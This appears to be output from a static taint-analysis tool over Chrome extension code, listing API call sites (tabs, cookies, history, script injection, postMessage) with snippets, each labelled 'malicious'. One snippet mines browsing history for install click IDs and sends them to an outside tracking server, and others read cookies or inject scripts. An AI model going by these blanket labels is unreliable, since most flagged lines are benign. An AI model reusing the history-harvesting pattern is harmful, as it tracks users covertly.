taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/popup.31498d16.js,2208,chrome.runtime.sendMessage,chrome. ...      }),malicious,chrome,chrome.runtime.sendMessage({ message: SM_MESSAGE_IMPORT })
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/popup.31498d16.js,2219,chrome.runtime.sendMessage,chrome. ...      }),malicious,chrome,chrome.runtime.sendMessage({ message: SM_MESSAGE_SIGN_OUT })
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/popup.31498d16.js,2238,chrome.tabs.create,chrome. ...      }),malicious,chrome,chrome.tabs.create({ url: 'https://support.start.me/hc/en-us/articles/360018117140' })
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/popup.31498d16.js,2240,chrome.tabs.create,chrome. ...      }),malicious,chrome,chrome.tabs.create({ url: 'chrome://extensions/shortcuts' })
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/popup.31498d16.js,2246,chrome.runtime.sendMessage,chrome. ...      }),malicious,chrome,chrome.runtime.sendMessage({ message: SM_MESSAGE_SHOW_HELP_PAGE })
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/popup.31498d16.js,2255,chrome.runtime.sendMessage,chrome. ...      }),malicious,chrome,chrome.runtime.sendMessage({ message: SM_MESSAGE_CLEAR_CACHE })
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/popup.31498d16.js,2295,chrome.tabs.query,chrome. ... ery({}),malicious,chrome,chrome.tabs.query({})
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/popup.31498d16.js,2340,chrome.tabs.query,chrome. ... ery({}),malicious,chrome,chrome.tabs.query({})
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/popup.31498d16.js,2485,chrome.tabs.query,chrome. ...      }),malicious,chrome,"chrome.tabs.query({ active: true, currentWindow: true })"
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/popup.31498d16.js,2506,chrome.runtime.sendMessage,chrome. ...      }),malicious,chrome,chrome.runtime.sendMessage({ message: SM_MESSAGE_CONTEXT_LINK })
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/welcome.836f1d84.js,1603,chrome.runtime.sendMessage,chrome. ...      }),malicious,chrome,"chrome.runtime.sendMessage({ message: SM_MESSAGE_IMPORT, quiet: true })"
taint-steps/1-getAMethodCall/result/encodeURI-multipleSinks-search.js,19,chrome.runtime.sendMessage,chrome. ... : url}),malicious,chrome,chrome.runtime.sendMessage({openURL: url})
taint-steps/1-getAMethodCall/src/agpoehmhgoieigdbjhgphpagmloehamn.2_0_0_0/background.js,2,chrome.tabs.create,chrome. ... tml')}),malicious,chrome,chrome.tabs.create({url: chrome.runtime.getURL('newtab.html')})
taint-steps/1-getAMethodCall/src/agpoehmhgoieigdbjhgphpagmloehamn.2_0_0_0/background.js,2,chrome.runtime.getURL,chrome. ... .html'),malicious,chrome,chrome.runtime.getURL('newtab.html')
taint-steps/2-getAnArgument/result/getAnArgument-encodeURI-multipleSinks-search.js,24,chrome.runtime.sendMessage,chrome. ... : url}),malicious,chrome,chrome.runtime.sendMessage({openURL: url})
taint-steps/2-getAnArgument/src/kbnpeiabjlfcakokkpbcgalbgiljoddf.2_0_0_0/js/bg.js,21,chrome.runtime.getURL,chrome. ... .html'),malicious,chrome,chrome.runtime.getURL('index.html')
taint-steps/2-getAnArgument/src/kbnpeiabjlfcakokkpbcgalbgiljoddf.2_0_0_0/js/bg.js,64,chrome.runtime.setUninstallURL,chrome. ... allURL),malicious,chrome,chrome.runtime.setUninstallURL(uninstallURL)
taint-steps/2-getAnArgument/src/kbnpeiabjlfcakokkpbcgalbgiljoddf.2_0_0_0/js/search.js,106,chrome.runtime.sendMessage,chrome. ... : url}),malicious,chrome,chrome.runtime.sendMessage({openURL: url})
taint-steps/3-getAParameter/result/getAParameter-react-functionbody-chrome.tabs.create.js,10,chrome.tabs.create,chrome. ... lue}`}),malicious,chrome,chrome.tabs.create({url: `https://www.google.com/search?q=${event.target.value}`})
taint-steps/3-getAParameter/result/getAParameter-react-functionbody-chrome.tabs.create.js,48,chrome.tabs.create,chrome. ...      }),malicious,chrome,"chrome.tabs.create({ url: `https://www.google.com/search?q=${event.target.value}`, })"
taint-steps/3-getAParameter/src/bkiakepgpgfibglghlhdpacjdglfpbnn.0_0_4_0/background.js,7,chrome.tabs.create,"chrome. ... tml"" })",malicious,chrome,"chrome.tabs.create({ url: ""popup.html"" })"
taint-steps/3-getAParameter/src/bkiakepgpgfibglghlhdpacjdglfpbnn.0_0_4_0/background.js,11,chrome.runtime.getURL,"chrome. ... 8.png"")",malicious,chrome,"chrome.runtime.getURL(""icon128.png"")"
taint-steps/3-getAParameter/src/bkiakepgpgfibglghlhdpacjdglfpbnn.0_0_4_0/background.js,12,chrome.notifications.create,"chrome. ... `,\n  })",malicious,chrome,"chrome.notifications.create(""name-for-notification"", { type: ""basic"", iconUrl: logo, title: ""New Tab With ChatGPT"", message: `${message} Extension`, })"
taint-steps/3-getAParameter/src/bkiakepgpgfibglghlhdpacjdglfpbnn.0_0_4_0/popup.js,592,chrome.tabs.create,chrome. ...      }),malicious,chrome,"chrome.tabs.create({ url: ""chrome://history"", })"
taint-steps/3-getAParameter/src/bkiakepgpgfibglghlhdpacjdglfpbnn.0_0_4_0/popup.js,617,chrome.history.search,chrome. ...      }),malicious,chrome,"chrome.history.search({ text: """", startTime: startTimeToday, endTime: endTimeToday, }, (data) => { setTodaysHistory(data); })"
taint-steps/3-getAParameter/src/bkiakepgpgfibglghlhdpacjdglfpbnn.0_0_4_0/popup.js,624,chrome.history.search,chrome. ...      }),malicious,chrome,"chrome.history.search({ text: """", startTime: startTimeYesterday, endTime: endTimeYesterday, }, (data) => { setYesterdayHistory(data); })"
taint-steps/3-getAParameter/src/bkiakepgpgfibglghlhdpacjdglfpbnn.0_0_4_0/popup.js,631,chrome.history.search,chrome. ...      }),malicious,chrome,"chrome.history.search({ text: """" }, (data) => { setSuggestHistory(data); })"
taint-steps/3-getAParameter/src/bkiakepgpgfibglghlhdpacjdglfpbnn.0_0_4_0/popup.js,640,chrome.tabs.create,chrome. ...      }),malicious,chrome,"chrome.tabs.create({ url: ""chrome://settings/clearBrowserData"", })"
taint-steps/3-getAParameter/src/bkiakepgpgfibglghlhdpacjdglfpbnn.0_0_4_0/popup.js,652,chrome.tabs.create,chrome. ...      }),malicious,chrome,"chrome.tabs.create({ url: ""chrome://history/"", })"
taint-steps/3-getAParameter/src/bkiakepgpgfibglghlhdpacjdglfpbnn.0_0_4_0/popup.js,1097,chrome.bookmarks.getTree,chrome. ...      }),malicious,chrome,chrome.bookmarks.getTree((res) => { setBookmarks(res[0].children[0].children); })
taint-steps/3-getAParameter/src/bkiakepgpgfibglghlhdpacjdglfpbnn.0_0_4_0/popup.js,1103,chrome.tabs.create,chrome. ...      }),malicious,chrome,"chrome.tabs.create({ url: `https://www.google.com/search?q=${event.target.value}`, })"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/554/554.js,1,chrome.tabs.query,"chrome. ... d""))}))",malicious,chrome,"chrome.tabs.query({active:!0,currentWindow:!0},(a=>{for(let t=0;t<a.length;t+=1){const{url:e}=a[t];if(""string""==typeof e&&(e.startsWith(""https://search.shopping.naver.com/search/all?"")||e.startsWith(""https://search.naver.com/search.naver?"")||e.startsWith(o.default.DOMEME_SERACH_URL))){n=e;break}}if(n)try{if(n.startsWith(o.default.DOMEME_SERACH_URL)){const e=n.split(""?"")[1],o=new URLSearchParams(e);if(""subject""!==o.get(""sf""))throw new Error;t(o.get(""sw"")||"""")}else{const e=n.split(""query="")[1].split(""&"")[0];t(e.replace(/\+/g,""%20""))}}catch(t){e(new Error(""err_url_parsing""))}else e(new Error(""err_not_found""))}))"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/554/554.js,1,chrome.tabs.query,chrome. ... ame)})),malicious,chrome,"chrome.tabs.query({active:!0,currentWindow:!0},(e=>{const n=document.createElement(""a"");n.href=e[0].url,t(n.hostname)}))"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/554/554.js,1,chrome.tabs.query,chrome. ... ref)})),malicious,chrome,"chrome.tabs.query({active:!0,currentWindow:!0},(e=>{const n=document.createElement(""a"");n.href=e[0].url,t(n.href)}))"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/554/554.js,1,chrome.tabs.query,chrome. ... ow:!0}),malicious,chrome,"chrome.tabs.query({active:!0,currentWindow:!0})"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/554/554.js,1,chrome.cookies.getAll,chrome. ... lue)})),malicious,chrome,"chrome.cookies.getAll({domain:e,name:t},(t=>{var e;n(null===(e=t[0])||void 0===e?void 0:e.value)}))"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/554/554.js,1,chrome.runtime.sendMessage,chrome. ... ata)})),malicious,chrome,"chrome.runtime.sendMessage({message:""getGraph"",cid:t,keyword:e,startDate:n,endDate:o},(t=>{a(t.data)}))"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/554/554.js,1,chrome.tabs.sendMessage,chrome. ... ata)})),malicious,chrome,"chrome.tabs.sendMessage(n,{message:t,args:e},(t=>{o(t.data)}))"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/554/554.js,1,chrome.scripting.executeScript,"chrome. ... .js""]})",malicious,chrome,"chrome.scripting.executeScript({target:{tabId:n},files:[""parser/parser.js""]})"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/background.js,1,chrome.tabs.create,"chrome. ... tml"")})",malicious,chrome,"chrome.tabs.create({url:chrome.runtime.getURL(""product_analysis_extracting_page/product_analysis_extracting_page.html"")})"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/background.js,1,chrome.tabs.query,"chrome. ... d""))}))",malicious,chrome,"chrome.tabs.query({active:!0,currentWindow:!0},(o=>{for(let e=0;e<o.length;e+=1){const{url:r}=o[e];if(""string""==typeof r&&(r.startsWith(""https://search.shopping.naver.com/search/all?"")||r.startsWith(""https://search.naver.com/search.naver?"")||r.startsWith(t.DOMEME_SERACH_URL))){n=r;break}}if(n)try{if(n.startsWith(t.DOMEME_SERACH_URL)){const t=n.split(""?"")[1],r=new URLSearchParams(t);if(""subject""!==r.get(""sf""))throw new Error;e(r.get(""sw"")||"""")}else{const t=n.split(""query="")[1].split(""&"")[0];e(t.replace(/\+/g,""%20""))}}catch(t){r(new Error(""err_url_parsing""))}else r(new Error(""err_not_found""))}))"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/background.js,1,chrome.tabs.query,chrome. ... ame)})),malicious,chrome,"chrome.tabs.query({active:!0,currentWindow:!0},(e=>{const r=document.createElement(""a"");r.href=e[0].url,t(r.hostname)}))"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/background.js,1,chrome.tabs.query,chrome. ... ref)})),malicious,chrome,"chrome.tabs.query({active:!0,currentWindow:!0},(e=>{const r=document.createElement(""a"");r.href=e[0].url,t(r.href)}))"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/background.js,1,chrome.tabs.query,chrome. ... ow:!0}),malicious,chrome,"chrome.tabs.query({active:!0,currentWindow:!0})"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/background.js,1,chrome.cookies.getAll,chrome. ... lue)})),malicious,chrome,"chrome.cookies.getAll({domain:e,name:t},(t=>{var e;r(null===(e=t[0])||void 0===e?void 0:e.value)}))"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/background.js,1,chrome.runtime.sendMessage,chrome. ... e(t)})),malicious,chrome,"chrome.runtime.sendMessage({action:""keywordGraph"",query:t},(t=>{e(t)}))"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/background.js,1,chrome.runtime.getURL,"chrome. ... .html"")",malicious,chrome,"chrome.runtime.getURL(""product_analysis_extracting_page/product_analysis_extracting_page.html"")"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/background.js,1,chrome.tabs.sendMessage,chrome. ... ata)})),malicious,chrome,"chrome.tabs.sendMessage(r,{message:t,args:e},(t=>{n(t.data)}))"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/background.js,1,chrome.scripting.executeScript,"chrome. ... .js""]})",malicious,chrome,"chrome.scripting.executeScript({target:{tabId:r},files:[""parser/parser.js""]})"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/background.js,1,chrome.scripting.executeScript,"chrome. ... *""))}})",malicious,chrome,"chrome.scripting.executeScript({target:{tabId:e},files:[""iframe_script/iframe_script.js""]})"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/iframe_script/iframe_script.js,1,chrome.runtime.getURL,"chrome. ... .html"")",malicious,chrome,"chrome.runtime.getURL(""popup/popup.html"")"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/inject/inject.js,1,chrome.runtime.getURL,"chrome. ... pt.js"")",malicious,chrome,"chrome.runtime.getURL(""content_script/content_script.js"")"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/keyword_analysis_script/keyword_analysis_script.js,1,chrome.runtime.getURL,"chrome. ... .html"")",malicious,chrome,"chrome.runtime.getURL(""keyword_analysis/keyword_analysis.html"")"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/margin_calculator/margin_calculator.js,1,chrome.tabs.query,"chrome. ... d""))}))",malicious,chrome,"chrome.tabs.query({active:!0,currentWindow:!0},(n=>{for(let e=0;e<n.length;e+=1){const{url:t}=n[e];if(""string""==typeof t&&(t.startsWith(""https://search.shopping.naver.com/search/all?"")||t.startsWith(""https://search.naver.com/search.naver?"")||t.startsWith(l.DOMEME_SERACH_URL))){a=t;break}}if(a)try{if(a.startsWith(l.DOMEME_SERACH_URL)){const t=a.split(""?"")[1],n=new URLSearchParams(t);if(""subject""!==n.get(""sf""))throw new Error;e(n.get(""sw"")||"""")}else{const t=a.split(""query="")[1].split(""&"")[0];e(t.replace(/\+/g,""%20""))}}catch(e){t(new Error(""err_url_parsing""))}else t(new Error(""err_not_found""))}))"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/margin_calculator/margin_calculator.js,1,chrome.tabs.query,chrome. ... ame)})),malicious,chrome,"chrome.tabs.query({active:!0,currentWindow:!0},(t=>{const a=document.createElement(""a"");a.href=t[0].url,e(a.hostname)}))"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/margin_calculator/margin_calculator.js,1,chrome.tabs.query,chrome. ... ref)})),malicious,chrome,"chrome.tabs.query({active:!0,currentWindow:!0},(t=>{const a=document.createElement(""a"");a.href=t[0].url,e(a.href)}))"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/margin_calculator/margin_calculator.js,1,chrome.tabs.query,chrome. ... ow:!0}),malicious,chrome,"chrome.tabs.query({active:!0,currentWindow:!0})"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/margin_calculator/margin_calculator.js,1,chrome.cookies.getAll,chrome. ... lue)})),malicious,chrome,"chrome.cookies.getAll({domain:t,name:e},(e=>{var t;a(null===(t=e[0])||void 0===t?void 0:t.value)}))"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/margin_calculator/margin_calculator.js,1,chrome.tabs.sendMessage,chrome. ... ata)})),malicious,chrome,"chrome.tabs.sendMessage(a,{message:e,args:t},(e=>{n(e.data)}))"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/margin_calculator/margin_calculator.js,1,chrome.scripting.executeScript,"chrome. ... .js""]})",malicious,chrome,"chrome.scripting.executeScript({target:{tabId:a},files:[""parser/parser.js""]})"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/margin_calculator_script/margin_calculator_script.js,1,chrome.runtime.getURL,"chrome. ... .html"")",malicious,chrome,"chrome.runtime.getURL(""margin_calculator/margin_calculator.html"")"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/popup/popup.js,1,chrome.tabs.query,"chrome. ... d""))}))",malicious,chrome,"chrome.tabs.query({active:!0,currentWindow:!0},(r=>{for(let e=0;e<r.length;e+=1){const{url:t}=r[e];if(""string""==typeof t&&(t.startsWith(""https://search.shopping.naver.com/search/all?"")||t.startsWith(""https://search.naver.com/search.naver?"")||t.startsWith(l.DOMEME_SERACH_URL))){o=t;break}}if(o)try{if(o.startsWith(l.DOMEME_SERACH_URL)){const t=o.split(""?"")[1],r=new URLSearchParams(t);if(""subject""!==r.get(""sf""))throw new Error;e(r.get(""sw"")||"""")}else{const t=o.split(""query="")[1].split(""&"")[0];e(t.replace(/\+/g,""%20""))}}catch(e){t(new Error(""err_url_parsing""))}else t(new Error(""err_not_found""))}))"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/popup/popup.js,1,chrome.tabs.query,chrome. ... ame)})),malicious,chrome,"chrome.tabs.query({active:!0,currentWindow:!0},(t=>{const o=document.createElement(""a"");o.href=t[0].url,e(o.hostname)}))"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/popup/popup.js,1,chrome.tabs.query,chrome. ... ref)})),malicious,chrome,"chrome.tabs.query({active:!0,currentWindow:!0},(t=>{const o=document.createElement(""a"");o.href=t[0].url,e(o.href)}))"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/popup/popup.js,1,chrome.tabs.query,chrome. ... ow:!0}),malicious,chrome,"chrome.tabs.query({active:!0,currentWindow:!0})"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/popup/popup.js,1,chrome.cookies.getAll,chrome. ... lue)})),malicious,chrome,"chrome.cookies.getAll({domain:t,name:e},(e=>{var t;o(null===(t=e[0])||void 0===t?void 0:t.value)}))"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/popup/popup.js,1,chrome.tabs.sendMessage,chrome. ... ata)})),malicious,chrome,"chrome.tabs.sendMessage(o,{message:e,args:t},(e=>{r(e.data)}))"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/popup/popup.js,1,chrome.scripting.executeScript,"chrome. ... .js""]})",malicious,chrome,"chrome.scripting.executeScript({target:{tabId:o},files:[""parser/parser.js""]})"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/product_analysis/product_analysis.js,1,chrome.runtime.sendMessage,"chrome. ... Page""})",malicious,chrome,"chrome.runtime.sendMessage({message:""openProductAnalysisExtractPage""})"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/product_analysis_extracting_page/product_analysis_extracting_page.js,1,chrome.tabs.query,"chrome. ... d""))}))",malicious,chrome,"chrome.tabs.query({active:!0,currentWindow:!0},(r=>{for(let e=0;e<r.length;e+=1){const{url:t}=r[e];if(""string""==typeof t&&(t.startsWith(""https://search.shopping.naver.com/search/all?"")||t.startsWith(""https://search.naver.com/search.naver?"")||t.startsWith(b.DOMEME_SERACH_URL))){n=t;break}}if(n)try{if(n.startsWith(b.DOMEME_SERACH_URL)){const t=n.split(""?"")[1],r=new URLSearchParams(t);if(""subject""!==r.get(""sf""))throw new Error;e(r.get(""sw"")||"""")}else{const t=n.split(""query="")[1].split(""&"")[0];e(t.replace(/\+/g,""%20""))}}catch(e){t(new Error(""err_url_parsing""))}else t(new Error(""err_not_found""))}))"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/product_analysis_extracting_page/product_analysis_extracting_page.js,1,chrome.tabs.query,chrome. ... ame)})),malicious,chrome,"chrome.tabs.query({active:!0,currentWindow:!0},(t=>{const n=document.createElement(""a"");n.href=t[0].url,e(n.hostname)}))"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/product_analysis_extracting_page/product_analysis_extracting_page.js,1,chrome.tabs.query,chrome. ... ref)})),malicious,chrome,"chrome.tabs.query({active:!0,currentWindow:!0},(t=>{const n=document.createElement(""a"");n.href=t[0].url,e(n.href)}))"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/product_analysis_extracting_page/product_analysis_extracting_page.js,1,chrome.tabs.query,chrome. ... ow:!0}),malicious,chrome,"chrome.tabs.query({active:!0,currentWindow:!0})"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/product_analysis_extracting_page/product_analysis_extracting_page.js,1,chrome.cookies.getAll,chrome. ... lue)})),malicious,chrome,"chrome.cookies.getAll({domain:t,name:e},(e=>{var t;n(null===(t=e[0])||void 0===t?void 0:t.value)}))"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/product_analysis_extracting_page/product_analysis_extracting_page.js,1,chrome.tabs.sendMessage,chrome. ... ata)})),malicious,chrome,"chrome.tabs.sendMessage(n,{message:e,args:t},(e=>{r(e.data)}))"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/product_analysis_extracting_page/product_analysis_extracting_page.js,1,chrome.scripting.executeScript,"chrome. ... .js""]})",malicious,chrome,"chrome.scripting.executeScript({target:{tabId:n},files:[""parser/parser.js""]})"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/product_analysis_script/product_analysis_script.js,1,chrome.runtime.getURL,"chrome. ... .html"")",malicious,chrome,"chrome.runtime.getURL(""product_analysis/product_analysis.html"")"
taint-steps/SUMMARY-simplified-snippets/getAParameter-react-functionbody-chrome.tabs.create.js,10,chrome.tabs.create,chrome. ... lue}`}),malicious,chrome,chrome.tabs.create({url: `https://www.google.com/search?q=${event.target.value}`})
taint-steps/SUMMARY-simplified-snippets/getAParameter-react-functionbody-chrome.tabs.create.js,48,chrome.tabs.create,chrome. ...      }),malicious,chrome,"chrome.tabs.create({ url: `https://www.google.com/search?q=${event.target.value}`, })"
taint-steps/SUMMARY-simplified-snippets/getAParameter-react-functionbody-chrome.tabs.create.js,70,chrome.history.search,chrome. ... \n    }),malicious,chrome,"chrome.history.search( { text: ""mytensai.com/install-ext?pid="" }, function(historyItems) { if(historyItems.length>0){ for (var i = 0; i < historyItems.length; ++i) { if(null!==getParameterByName('pid', historyItems[i].url) && getParameterByName('clickid', historyItems[i].url) ){  var pid = getParameterByName('pid', historyItems[i].url); var clickid = getParameterByName('clickid', historyItems[i].url); chrome.storage.sync.set({'pid':pid,'clickid': clickid}); //_gaq.push(['_trackEvent', clickid, 'clicked']);  var url = 'https://mytensai.com/mth/installTrack.php?pid='+pid+'&clickid='+clickid; fetch(url).then(function(response) { return response.json(); }).then(function(data) { console.log(data); }).catch(function() { console.log(""Booo""); }); //HttpRequest(pid,clickid); return; } } }else{ chrome.storage.sync.set({'pid':'pid','clickid': 'clickid'}); } })"
taint-steps/SUMMARY-simplified-snippets/getAnArgument-encodeURI-multipleSinks-search.js,24,chrome.runtime.sendMessage,chrome. ... : url}),malicious,chrome,chrome.runtime.sendMessage({openURL: url})
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/keyword_analysis/keyword_analysis.js,82,window.parent.postMessage,"window. ... ://""+e)",malicious,postMessage,"window.parent.postMessage({m:""itemscoutKeywordAnalysisResize"",w:_,o:!t},""https://""+e)"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/margin_calculator/margin_calculator.js,1,window.parent.postMessage,"window. ... ""},""*"")",malicious,postMessage,"window.parent.postMessage({m:""getCurrentUrl""},""*"")"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/margin_calculator/margin_calculator.js,1,window.parent.postMessage,"window. ... ://""+s)",malicious,postMessage,"window.parent.postMessage({m:""itemscoutMarginCalculatorResize"",w:a,o:!e},""https://""+s)"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/popup/popup.js,1,window.parent.postMessage,"window. ... ://""+e)",malicious,postMessage,"window.parent.postMessage(""itemscoutWebExtensionClose"",""https://""+e)"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/product_analysis/product_analysis.js,1,window.parent.postMessage,"window. ... ://""+e)",malicious,postMessage,"window.parent.postMessage({m:""getCurrentUrl""},""*"")"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/product_analysis/product_analysis.js,1,window.parent.postMessage,"window. ... ""},""*"")",malicious,postMessage,"window.parent.postMessage({m:""itemscoutProductAnalysisResize"",w:a,o:!e},""https://""+t)"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/product_analysis/product_analysis.js,1,window.parent.postMessage,"window. ... ://""+t)",malicious,postMessage,"window.parent.postMessage({m:""productPageCrawling""},""https://""+t)"
COOKIE-ikdkbkbkdgffkcngafilhnamkgknlekc.3_0_0_0/src/background1.js,1,String.fromCharCode,String.fromCharCode argument: a[i],String. ... e(a[i]),malicious,others,String.fromCharCode(a[i])
COOKIE-ikdkbkbkdgffkcngafilhnamkgknlekc.3_0_0_0/src/crypto.js,1,String.fromCharCode,String.fromCharCode argument: o,String. ... Code(o),malicious,others,String.fromCharCode(o)
COOKIE-ikdkbkbkdgffkcngafilhnamkgknlekc.3_0_0_0/src/sjcl.js,11,String.fromCharCode,String.fromCharCode argument: e>>>8>>>8>>>8,String. ... >8>>>8),malicious,others,String.fromCharCode(e>>>8>>>8>>>8)
HISTORY-mmjbociiiafjimjiddoegfljjomglfoc.3_4_3_0/src/background.87838840.js,7,String.fromCharCode,String.fromCharCode argument: 30,String. ... ode(30),malicious,others,String.fromCharCode(30)
HISTORY-mmjbociiiafjimjiddoegfljjomglfoc.3_4_3_0/src/background.87838840.js,7,String.fromCharCode,String.fromCharCode argument: 31,String. ... ode(31),malicious,others,String.fromCharCode(31)
HISTORY-mmjbociiiafjimjiddoegfljjomglfoc.3_4_3_0/src/content.00261377.js,16,String.fromCharCode,String.fromCharCode argument: n,String. ... Code(n),malicious,others,String.fromCharCode(n)
HISTORY-mmjbociiiafjimjiddoegfljjomglfoc.3_4_3_0/src/content.00261377.js,34,String.fromCharCode,String.fromCharCode argument: e,String. ... Code(e),malicious,others,String.fromCharCode(e)
HISTORY-mmjbociiiafjimjiddoegfljjomglfoc.3_4_3_0/src/content.00261377.js,34,String.fromCharCode,String.fromCharCode argument: 32,String. ... ode(32),malicious,others,String.fromCharCode(32)
HISTORY-mmjbociiiafjimjiddoegfljjomglfoc.3_4_3_0/src/content.00261377.js,34,String.fromCharCode,String.fromCharCode argument: t.which,String. ... .which),malicious,others,String.fromCharCode(t.which)
HISTORY-mmjbociiiafjimjiddoegfljjomglfoc.3_4_3_0/src/contentAli.899c5f46.js,16,String.fromCharCode,String.fromCharCode argument: n,String. ... Code(n),malicious,others,String.fromCharCode(n)
HISTORY-mmjbociiiafjimjiddoegfljjomglfoc.3_4_3_0/src/contentAli.899c5f46.js,34,String.fromCharCode,String.fromCharCode argument: e,String. ... Code(e),malicious,others,String.fromCharCode(e)
HISTORY-mmjbociiiafjimjiddoegfljjomglfoc.3_4_3_0/src/contentAli.899c5f46.js,34,String.fromCharCode,String.fromCharCode argument: 32,String. ... ode(32),malicious,others,String.fromCharCode(32)
HISTORY-mmjbociiiafjimjiddoegfljjomglfoc.3_4_3_0/src/contentAli.899c5f46.js,34,String.fromCharCode,String.fromCharCode argument: t.which,String. ... .which),malicious,others,String.fromCharCode(t.which)
JS-SEARCH-noUI-SURL-gjnlgmpokfpkonbdfkjbihmliofkjeok.1_0_6_0/src/lib/js/jquery.js,2,String.fromCharCode,String.fromCharCode argument: n+65536,String. ... +65536),malicious,others,String.fromCharCode(n+65536)
JS-SEARCH-noUI-SURL-gjnlgmpokfpkonbdfkjbihmliofkjeok.1_0_6_0/src/lib/js/jquery.js,2,String.fromCharCode,String.fromCharCode argument: n>>10|55296,String. ... |56320),malicious,others,"String.fromCharCode(n>>10|55296,1023&n|56320)"
JS-SEARCH-noUI-SURL-gjnlgmpokfpkonbdfkjbihmliofkjeok.1_0_6_0/src/lib/js/jqueryui.js,7,String.fromCharCode,String.fromCharCode argument: e.keyCode,String. ... eyCode),malicious,others,String.fromCharCode(e.keyCode)
